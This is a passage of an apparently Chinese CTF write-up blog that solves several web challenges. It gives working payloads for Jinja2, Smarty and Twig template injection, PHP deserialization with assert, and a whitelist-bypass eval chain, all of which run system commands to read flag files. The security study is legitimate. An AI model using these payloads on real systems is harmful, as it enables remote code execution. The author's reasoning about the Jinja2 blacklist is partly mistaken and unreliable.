s.replace(<span class="hljs-string">&#x27;(&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>).replace(<span class="hljs-string">&#x27;)&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>        blacklist = [<span class="hljs-string">&#x27;config&#x27;</span>, <span class="hljs-string">&#x27;self&#x27;</span>]<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-string">&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(c) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> blacklist]) + s<br><br>    <span class="hljs-keyword">return</span> flask.render_template_string(safe_jinja(shrine))<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(debug=<span class="hljs-literal">True</span>)<br><br></code></pre></td></tr></table></figure>
<p>首先在shrine路径下测试ssti能否正常执行</p>
<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">/shrine/</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">2</span>*<span class="hljs-number">6</span>&#125;&#125;</span><br></code></pre></td></tr></table></figure>
<p><img src="/images/LK7HQZB5I2M18ONT.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs scss">def <span class="hljs-built_in">safe_jinja</span>(s):<br>       s = s.<span class="hljs-built_in">replace</span>(<span class="hljs-string">&#x27;(&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>).<span class="hljs-built_in">replace</span>(<span class="hljs-string">&#x27;)&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>       blacklist = [<span class="hljs-string">&#x27;config&#x27;</span>, <span class="hljs-string">&#x27;self&#x27;</span>]<br>       return <span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-built_in">join</span>([<span class="hljs-string">&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(c) for c in blacklist]) + s<br><br>   return flask.<span class="hljs-built_in">render_template_string</span>(<span class="hljs-built_in">safe_jinja</span>(shrine))<br></code></pre></td></tr></table></figure>
<p>再来分析这段代码<br>这段代码使用了一个黑名单blacklist,其中包含了要在传入的字符串s中被替换的一些字符串(在这里config和self)。对于每个黑名单的字符串c，它都会生成一个jinja2模板语法的字符串<code>&#123;&#123;% set c=None %&#125;&#125;</code>，然后将这些字符串连接到原始的字符串s之后<br>python还有一些内置函数比如url_for和get_flashed_messages<br>payload</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/shrine/</span>&#123;&#123;url_for.__globals__&#125;&#125;<span class="hljs-regexp">//</span>返回视图函数的url，对对象的全局命名空间的访问<br></code></pre></td></tr></table></figure>
<p><img src="/images/PT26X6LGOGY57QTEN2.png" srcset="/img/loading.gif" lazyload><br>payload</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>current_app 允许你获取当前应用的一些属性和配置信息<br><span class="hljs-regexp">/shrine/</span>&#123;&#123;url_for.__globals__[<span class="hljs-string">&#x27;current_app&#x27;</span>].config&#125;&#125;<br>-&gt;获取flag<br></code></pre></td></tr></table></figure>
<p><strong>config不是被列为黑名单了嘛？？？</strong><br>假设shrine为<code>/shrine/&#123;&#123;url_for.__globals__['current_app'].config&#125;&#125;</code><br>然后传递给safe_jinja函数，在这个情况下，blacklist包含了config,所以生成的jinja2模板字符串如下</p>
<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;% <span class="hljs-name">set</span> <span class="hljs-attr">config</span>=None %&#125;&#125;</span><span class="language-xml">/shrine/</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">url_for.__globals__</span>[&#x27;current_app&#x27;].config&#125;&#125;</span><br></code></pre></td></tr></table></figure>
<p>这个字符串中的<code>&#123;&#123;% set config=None %&#125;&#125;</code>部分是为了尝试设置config变量为None,但由于Jinja2的语法，这个设置操作在字符串中仅仅是一个字符串的一部分，而不会真正地执行。</p>
<p>因此，尽管看起来好像config被设置为None,实际上Jinja2只是把这部分当作普通的文本对待，并没有执行它。因此，在渲染模板时，config的值仍然是<code>url_for.__globals__[&#39;current_app&#39;].config</code>,而没有被设置为None<br><img src="/images/XCUV93B45O8I24U3VXW2.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="NPUCTF2020-ReadlezPHP"><a href="#NPUCTF2020-ReadlezPHP" class="headerlink" title="[NPUCTF2020]ReadlezPHP"></a>[NPUCTF2020]ReadlezPHP</h2><p>检索源代码<br><img src="/images/U30NAQ0SZE9VDQ7O.png" srcset="/img/loading.gif" lazyload><br>找到一个php文件，进去康康</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">#error_reporting(0);</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HelloPhp</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;a = <span class="hljs-string">&quot;Y-m-d h:i:s&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;b = <span class="hljs-string">&quot;date&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$a</span> = <span class="hljs-variable language_">$this</span>-&gt;a;<br>        <span class="hljs-variable">$b</span> = <span class="hljs-variable language_">$this</span>-&gt;b;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>(<span class="hljs-variable">$a</span>);<br>    &#125;<br>&#125;<br><span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HelloPhp</span>;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;source&#x27;</span>]))<br>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-keyword">die</span>(<span class="hljs-number">0</span>);<br>&#125;<br><br>@<span class="hljs-variable">$ppp</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;data&quot;</span>]);<br><br></code></pre></td></tr></table></figure>
<p>没啥好分析的，直接赋值序列化</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-variable">$c</span>-&gt;b=<span class="hljs-string">&#x27;assert&#x27;</span>;<br><span class="hljs-variable">$c</span>-&gt;a=<span class="hljs-string">&quot;phpinfo()&quot;</span>;<br>echo serialize(<span class="hljs-variable">$c</span>);<br><span class="hljs-regexp">//</span>O:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;HelloPhp&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;s:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;phpinfo()&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;b&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;assert&quot;</span>;&#125;<br></code></pre></td></tr></table></figure>
<p>在对象被销毁时，__destruct会被调用<br>也就是</p>
<figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">echo</span> <span class="hljs-function"><span class="hljs-title"><span class="hljs-built_in">assert</span></span>(<span class="hljs-string">&quot;phpinfo()&quot;</span>);</span><br></code></pre></td></tr></table></figure>
<p>assert与eval的功能基本相同，但不需要后面加<code>;</code><br>还有参数source不能出现，不然die(0)会直接结束脚本<br>payload</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?d</span>ata=<span class="hljs-symbol">O:</span><span class="hljs-number">8</span><span class="hljs-symbol">:<span class="hljs-string">&quot;HelloPhp&quot;</span></span><span class="hljs-symbol">:</span><span class="hljs-number">2</span><span class="hljs-symbol">:</span>&#123;<span class="hljs-symbol">s:</span><span class="hljs-number">1</span><span class="hljs-symbol">:<span class="hljs-string">&quot;a&quot;</span></span>;<span class="hljs-symbol">s:</span><span class="hljs-number">9</span><span class="hljs-symbol">:<span class="hljs-string">&quot;phpinfo()&quot;</span></span>;<span class="hljs-symbol">s:</span><span class="hljs-number">1</span><span class="hljs-symbol">:<span class="hljs-string">&quot;b&quot;</span></span>;<span class="hljs-symbol">s:</span><span class="hljs-number">6</span><span class="hljs-symbol">:<span class="hljs-string">&quot;assert&quot;</span></span>;&#125;<br></code></pre></td></tr></table></figure>
<p><img src="/images/YCMFTEQZQ5AMTYVRU31.png" srcset="/img/loading.gif" lazyload><br>详细–&gt;<a target="_blank" rel="noopener" href="https://blog.csdn.net/ojingzhiyuan12/article/details/88556074">eval与assert</a>&lt;–</p>
<h2 id="CISCN2019-华东南赛区-Web11"><a href="#CISCN2019-华东南赛区-Web11" class="headerlink" title="[CISCN2019 华东南赛区]Web11"></a>[CISCN2019 华东南赛区]Web11</h2><p><img src="/images/G35F0ZJN35S68IL67.png" srcset="/img/loading.gif" lazyload><br>检索页面发现有个显示ip的地方<br>先康康能不能xff伪造下ip<br><img src="/images/J3D1FCKLD0WT7OLY5XN.png" srcset="/img/loading.gif" lazyload><br>这时看到最下面显示<br>Build With Smarty !<br>Smarty是一个PHP的模板引擎，提供让程序逻辑与页面显示（HTML&#x2F;CSS）代码分离的功能。该框架出现过SSTI漏洞<br>ssti先上一张图<br><img src="/images/61b42a16c2b405e6ab1ada36470713f1.png" srcset="/img/loading.gif" lazyload><br>测试<code>a&#123;*comment*&#125;b</code><br><img src="/images/RJAZ6GRSWBE8ZLSC6R.png" srcset="/img/loading.gif" lazyload><br>按照正常逻辑，应该用php语言去查找flag。一般情况下输入{$smarty.version}就可以看到返回的smarty的版本号。该题目的Smarty版本是3.1.30<br><img src="/images/DY839XW0HNZF8LACB1OZG.png" srcset="/img/loading.gif" lazyload><br>在Smarty3的官方手册里有以下描述:<br>Smarty已经废弃{php}标签，强烈建议不要使用。在Smarty 3.1，{php}仅在SmartyBC中可用。所以只能另找方法<br><strong>{if}标签</strong><br>官方文档中看到这样的描述：<br>smarty的{if}条件判断和PHP的if非常相似，只是增加了一些特性。每个{if}必须有一个配对的{&#x2F;if}也可以使用{else}和{elseif}.全部的PHP条件表达式和函数都可以在if内使用，如||*,or,&amp;&amp;,and,is_array()，等等。。。所以也可以使用<code>&#123;if show_source(&quot;/flag&quot;)&#125;&#123;/if&#125;</code>来获得flag<br><img src="/images/NGOSYM3EL5ZN0KAAQ.png" srcset="/img/loading.gif" lazyload><br>或是</p>
<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="hljs-template-variable">&#123;<span class="hljs-keyword">if</span> system(&#x27;cat flag&#x27;)&#125;</span><span class="hljs-template-tag">&#123;/<span class="hljs-name">if</span>&#125;</span><br></code></pre></td></tr></table></figure>
<p>在前面的模板图中我们还可以使用另一种方法<br>xff中输入</p>
<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">7</span>*<span class="hljs-number">7</span>&#125;&#125;</span><br></code></pre></td></tr></table></figure>
<p><img src="/images/VYY7B6N5IKE3WV71CVL.png" srcset="/img/loading.gif" lazyload><br>再输入</p>
<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">7</span>*<span class="hljs-string">&#x27;7&#x27;</span>&#125;&#125;</span><br></code></pre></td></tr></table></figure>
<p>回显为49<br>确定为twig模板<br>RCE</p>
<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">system</span>(<span class="hljs-name">&#x27;ls&#x27;</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">//css index.php smarty templates_c xff</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">system</span>(<span class="hljs-name">&#x27;ls /&#x27;</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">system</span>(<span class="hljs-name">&#x27;cat /flag&#x27;</span>)&#125;&#125;</span><br></code></pre></td></tr></table></figure>
<p>flag在源码中👀</p>
<h2 id="CISCN-2019-初赛-Love-Math"><a href="#CISCN-2019-初赛-Love-Math" class="headerlink" title="[CISCN 2019 初赛]Love Math"></a>[CISCN 2019 初赛]Love Math</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-comment">//例子 c=20-1</span><br>    <span class="hljs-variable">$content</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$content</span>) &gt;= <span class="hljs-number">80</span>) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;太长了不会算&quot;</span>);<br>    &#125;<br>    <span class="hljs-variable">$blacklist</span> = [<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;\t&#x27;</span>, <span class="hljs-string">&#x27;\r&#x27;</span>, <span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;`&#x27;</span>, <span class="hljs-string">&#x27;\[&#x27;</span>, <span class="hljs-string">&#x27;\]&#x27;</span>];<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$blacklist</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$blackitem</span>) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$blackitem</span> . <span class="hljs-string">&#x27;/m&#x27;</span>, <span class="hljs-variable">$content</span>)) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;请不要输入奇奇怪怪的字符&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span><br>    <span class="hljs-variable">$whitelist</span> = [<span class="hljs-string">&#x27;abs&#x27;</span>, <span class="hljs-string">&#x27;acos&#x27;</span>, <span class="hljs-string">&#x27;acosh&#x27;</span>, <span class="hljs-string">&#x27;asin&#x27;</span>, <span class="hljs-string">&#x27;asinh&#x27;</span>, <span class="hljs-string">&#x27;atan2&#x27;</span>, <span class="hljs-string">&#x27;atan&#x27;</span>, <span class="hljs-string">&#x27;atanh&#x27;</span>, <span class="hljs-string">&#x27;base_convert&#x27;</span>, <span class="hljs-string">&#x27;bindec&#x27;</span>, <span class="hljs-string">&#x27;ceil&#x27;</span>, <span class="hljs-string">&#x27;cos&#x27;</span>, <span class="hljs-string">&#x27;cosh&#x27;</span>, <span class="hljs-string">&#x27;decbin&#x27;</span>, <span class="hljs-string">&#x27;dechex&#x27;</span>, <span class="hljs-string">&#x27;decoct&#x27;</span>, <span class="hljs-string">&#x27;deg2rad&#x27;</span>, <span class="hljs-string">&#x27;exp&#x27;</span>, <span class="hljs-string">&#x27;expm1&#x27;</span>, <span class="hljs-string">&#x27;floor&#x27;</span>, <span class="hljs-string">&#x27;fmod&#x27;</span>, <span class="hljs-string">&#x27;getrandmax&#x27;</span>, <span class="hljs-string">&#x27;hexdec&#x27;</span>, <span class="hljs-string">&#x27;hypot&#x27;</span>, <span class="hljs-string">&#x27;is_finite&#x27;</span>, <span class="hljs-string">&#x27;is_infinite&#x27;</span>, <span class="hljs-string">&#x27;is_nan&#x27;</span>, <span class="hljs-string">&#x27;lcg_value&#x27;</span>, <span class="hljs-string">&#x27;log10&#x27;</span>, <span class="hljs-string">&#x27;log1p&#x27;</span>, <span class="hljs-string">&#x27;log&#x27;</span>, <span class="hljs-string">&#x27;max&#x27;</span>, <span class="hljs-string">&#x27;min&#x27;</span>, <span class="hljs-string">&#x27;mt_getrandmax&#x27;</span>, <span class="hljs-string">&#x27;mt_rand&#x27;</span>, <span class="hljs-string">&#x27;mt_srand&#x27;</span>, <span class="hljs-string">&#x27;octdec&#x27;</span>, <span class="hljs-string">&#x27;pi&#x27;</span>, <span class="hljs-string">&#x27;pow&#x27;</span>, <span class="hljs-string">&#x27;rad2deg&#x27;</span>, <span class="hljs-string">&#x27;rand&#x27;</span>, <span class="hljs-string">&#x27;round&#x27;</span>, <span class="hljs-string">&#x27;sin&#x27;</span>, <span class="hljs-string">&#x27;sinh&#x27;</span>, <span class="hljs-string">&#x27;sqrt&#x27;</span>, <span class="hljs-string">&#x27;srand&#x27;</span>, <span class="hljs-string">&#x27;tan&#x27;</span>, <span class="hljs-string">&#x27;tanh&#x27;</span>];<br>    <span class="hljs-title function_ invoke__">preg_match_all</span>(<span class="hljs-string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, <span class="hljs-variable">$content</span>, <span class="hljs-variable">$used_funcs</span>);  <br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$used_funcs</span>[<span class="hljs-number">0</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$func</span>) &#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$func</span>, <span class="hljs-variable">$whitelist</span>)) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;请不要输入奇奇怪怪的函数&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//帮你算出答案</span><br>    <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;echo &#x27;</span>.<span class="hljs-variable">$content</span>.<span class="hljs-string">&#x27;;&#x27;</span>);<br>&#125; <br></code></pre></td></tr></table></figure>

<p>很有意思的题，照着答案+chat分析了很久，长见识了😊</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">if</span> (strlen($content) &gt;= <span class="hljs-number">80</span>) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;太长了不会算&quot;</span>);<br>    &#125; <br></code></pre></td></tr></table></figure>
<p>这个直接过，一般不会超过80个字符的</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$blacklist</span> = [<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;\t&#x27;</span>, <span class="hljs-string">&#x27;\r&#x27;</span>, <span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;`&#x27;</span>, <span class="hljs-string">&#x27;\[&#x27;</span>, <span class="hljs-string">&#x27;\]&#x27;</span>];<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$blacklist</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$blackitem</span>) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$blackitem</span> . <span class="hljs-string">&#x27;/m&#x27;</span>, <span class="hljs-variable">$content</span>)) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;请不要输入奇奇怪怪的字符&quot;</span>);<br>        &#125;<br>    &#125; <br></code></pre></td></tr></table></figure>
<p>给了个黑名单先不管</p>
<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">preg<span class="hljs-constructor">_match_all(&#x27;<span class="hljs-operator">/</span>[<span class="hljs-params">a</span>-<span class="hljs-params">zA</span>-Z_\<span class="hljs-params">x7f</span>-\<span class="hljs-params">xff</span>][<span class="hljs-params">a</span>-<span class="hljs-params">zA</span>-Z_0-9\<span class="hljs-params">x7f</span>-\<span class="hljs-params">xff</span>]<span class="hljs-operator">*</span><span class="hljs-operator">/</span>&#x27;, $<span class="hljs-params">content</span>, $<span class="hljs-params">used_funcs</span>)</span>;  <br>    foreach ($used_funcs<span class="hljs-literal">[<span class="hljs-number">0</span>]</span> <span class="hljs-keyword">as</span> $func) &#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">in</span><span class="hljs-constructor">_array($<span class="hljs-params">func</span>, $<span class="hljs-params">whitelist</span>)</span>) &#123;<br>            die(<span class="hljs-string">&quot;请不要输入奇奇怪怪的函数&quot;</span>);<br>        &#125;<br>    &#125; <br></code></pre></td></tr></table></figure>


<p>又给了个白名单，if里的意思为得有白名单里的函数</p>
<figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cos"><span class="hljs-built_in">$used</span>_funcs[<span class="hljs-number">0</span>] <span class="hljs-keyword">as</span> <span class="hljs-built_in">$func</span><br></code></pre></td></tr></table></figure>
<p>太抽象了，先理解为检索白名单<br>一个知识点是php中可以把函数名通过字符串的方式传递给一个变量，然后通过此变量动态调用函数。<br>理想中的传参是</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=(<span class="hljs-variable">$_GET</span>[a])(<span class="hljs-variable">$_GET</span>[b])&amp;a=system&amp;b=<span class="hljs-built_in">cat</span> /flag<br></code></pre></td></tr></table></figure>
<p>但是这里的a,b都不是白名单里的，这里替换一下</p>
<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams">?c=(<span class="hljs-symbol">$</span>_GET[<span class="hljs-built_in">pi</span>])(<span class="hljs-symbol">$</span>_GET[<span class="hljs-built_in">abs</span>])&amp;<span class="hljs-built_in">pi</span>=<span class="hljs-keyword">system</span>&amp;<span class="hljs-built_in">abs</span>=cat /flag<br></code></pre></td></tr></table></figure>
<p>这里的_GET是无法进行直接替换，而且[]也被黑名单过滤了<br>看看白名单有什么可以用的函数<br><strong>hex2bin()函数</strong><br>hex2bin()函数把十六进制值的字符串转换为ASCii字符<br>把_GET转化为十六进制<br><img src="/images/DJQB0VOJ373PVHM.png" srcset="/img/loading.gif" lazyload><br>hex2bin(5f 47 45 54)就是_GET,但是hex2bin()函数也不是白名单里面的，而且这里的5f 47 45 54也不能直接填入，这里会被</p>
<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">preg<span class="hljs-constructor">_match_all(&#x27;<span class="hljs-operator">/</span>[<span class="hljs-params">a</span>-<span class="hljs-params">zA</span>-Z_\<span class="hljs-params">x7f</span>-\<span class="hljs-params">xff</span>][<span class="hljs-params">a</span>-<span class="hljs-params">zA</span>-Z_0-9\<span class="hljs-params">x7f</span>-\<span class="hljs-params">xff</span>]<span class="hljs-operator">*</span><span class="hljs-operator">/</span>&#x27;, $<span class="hljs-params">content</span>, $<span class="hljs-params">used_funcs</span>)</span>;  <br></code></pre></td></tr></table></figure>
<p>来进行白名单的检测<br>这里的hex2bin()函数可以通过base_convert()函数来进行转换<br>base_convert()函数能够在任意进制之间转换数字<br>base_convert(37907361743,10,36)等于hex2bin(别问为什么是36进制，问就是这么转换会等于hex2bin😊)<br><img src="/images/ZIZM27JBL9XG2SZ5Y.png" srcset="/img/loading.gif" lazyload></p>
<p>里面的5f 47 45 54要用dechex()函数将10进制转换为16进制的数<br>dechex(1598506324),1598506324转换为16进制就是5f 47 45 54<br><img src="/images/QEKBJT3PLILCFXS6L7BG.png" srcset="/img/loading.gif" lazyload></p>
<p>payload</p>
<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams">/?c=<span class="hljs-symbol">$</span><span class="hljs-built_in">pi</span>=base_convert(<span class="hljs-number">37907361743</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>)(dechex(<span class="hljs-number">1598506324</span>));(<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span><span class="hljs-built_in">pi</span>)&#123;<span class="hljs-built_in">pi</span>&#125;((<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span><span class="hljs-built_in">pi</span>)&#123;<span class="hljs-built_in">abs</span>&#125;)&amp;<span class="hljs-built_in">pi</span>=<span class="hljs-keyword">system</span>&amp;<span class="hljs-built_in">abs</span>=cat /flag<br></code></pre></td></tr></table></figure>
<p><img src="/images/B5YT537OKAX6WR7R5O.png" srcset="/img/loading.gif" lazyload><br>flag出来了，再详细分析下<br>从前往后</p>
<p>base_convert(37907361743,10,36)-&gt;hex2bin</p>
<p>dechex(1598506324)-&gt;5f 47 45 54</p>
<p>$pi&#x3D;hex2bin(5f 47 45 54)-&gt;$pi&#x3D;_GET</p>
<p>管道符;连接</p>
<p>($$pi){pi}(($$pi){abs})</p>
<p>($_GET){pi}(($_GET){abs})</p>
<p>这个表达式实际上会尝试执行$_GET(pi)($_GET(abs))</p>
<p>所以此时c的值为c&#x3D;_GET$_GET(pi)($_GET(abs))</p>
<p>后面有对pi和abs赋值，带入</p>
<p>c&#x3D;system(cat &#x2F;flag)</p>
<h2 id="BSidesCF-2019-Futurella"><a href="#BSidesCF-2019-Futurella" class="headerlink" title="[BSidesCF 2019]Futurella"></a>[BSidesCF 2019]Futurella</h2><p>好简单，就藏在源代码里<br><img src="/images/IB0WVFS4XJ9N847G.png" srcset="/img/loading.gif" lazyload></p>
